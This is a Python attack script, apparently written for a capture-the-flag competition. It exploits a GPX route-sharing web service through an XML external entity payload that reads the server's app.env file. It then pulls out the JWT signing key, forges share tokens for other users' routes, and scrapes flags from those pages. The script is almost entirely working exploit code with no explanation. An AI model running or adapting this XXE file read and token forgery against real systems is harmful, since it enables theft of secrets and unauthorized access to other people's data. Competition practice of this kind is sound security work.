#!/usr/bin/env python3

import requests
import random
import string
import ua_generator
import re
import sys
import json
import jwt


port = 8000
flag_regexp = re.compile(r'[A-Z0-9]{31}=')

payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY test SYSTEM 'file:////app/app.env'>]>
<gpx version="1.1" creator="Your Application">
  <wpt lat="37.7749" lon="-122.4194">
    <name>San Francisco</name>
    <desc>City by the Bay</desc>
  </wpt>
  <wpt lat="36.7783" lon="-119.4179">
    <name>&test;</name>
    <desc>Central California</desc>
  </wpt>
  <trk>
    <name>Example Track</name>
    <trkseg>
      <trkpt lat="37.7749" lon="-122.4194">
        <ele>10</ele>
        <time>2023-01-01T12:00:00Z</time>
      </trkpt>
      <trkpt lat="37.7750" lon="-122.4195">
        <ele>20</ele>
        <time>2023-01-01T12:05:00Z</time>
      </trkpt>
      <trkpt lat="37.7751" lon="-122.4196">
        <ele>30</ele>
        <time>2023-01-01T12:10:00Z</time>
      </trkpt>
    </trkseg>
  </trk>
</gpx>"""


class Hacker:
    def __init__(self, ip):
        self.host = f"http://{ip}:{port}"
        self.session = requests.Session()
        self.session.headers = {"User-agent": ua_generator.generate().text}

        random_string = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8))
        self.username = random_string
        self.password = random_string

        self.signup()
        self.signin()


    def signup(self) -> str:
        resp = self.session.post(
            self.host + "/api/signup",
            json = {
                "username": self.username,
                "password": self.password
            }
        )
        return resp.text


    def signin(self) -> str:
        resp = self.session.post(
            self.host + "/api/signin",
            json = {
                "username": self.username,
                "password": self.password
            }
        )
        return resp.text


    def create_route(self) -> str:
        resp = self.session.post(
            self.host + "/api/route/create",
            json = {
                "title": f"Route of {self.username}.",
                "description": f"My hacker route, hehehe >;)"
            }
        )
        self.route_id = json.loads(resp.text)["id"]
        return resp.text


    def upload_gpx(self) -> str:
        resp = self.session.post(
            self.host + f"/api/route/{self.route_id}/upload",
            files = {
                "file": payload,
                "filename": f"{self.username}.gpx"
            }
        )
        return resp.text


    def view_route(self, route_id, share_token) -> str:
        resp = self.session.get(
            self.host + f"/api/route/{route_id}",
            params = {"token": share_token}
        )
        return resp.text


    def find_flags(self, text: str):
        print( flag_regexp.findall(text), flush=True )

    
def main():

    try:
        ip = sys.argv[1]
    except:
        print(f"USAGE:\t{sys.argv[0]} <victim-ip-address>")
        sys.exit(1)

    uploader = Hacker(ip)
    uploader.create_route()
    upload_resp = uploader.upload_gpx()
    JWT_KEY = re.findall(r"JWT_KEY=([A-Z0-9]+)", upload_resp)[0]

    route_ids = get_hint(ip)
    for route_id in route_ids:
        share_token = jwt.encode( {"route_id": route_id}, JWT_KEY, algorithm="HS256" )
        route_page = uploader.view_route(route_id, share_token)
        uploader.find_flags(route_page)


def get_hint(ip):
    # hint = requests.get(f"...{ip}..."").text
    hint = [
        "659594625136f1b0ca0637cf",
        "659594625136f1b0ca0637d1",
        "6595946259c159b6fe678766",
        "659594625136f1b0ca0637d3",
        "6595946259c159b6fe678767"
    ]
    return hint


if __name__ == "__main__":
    main()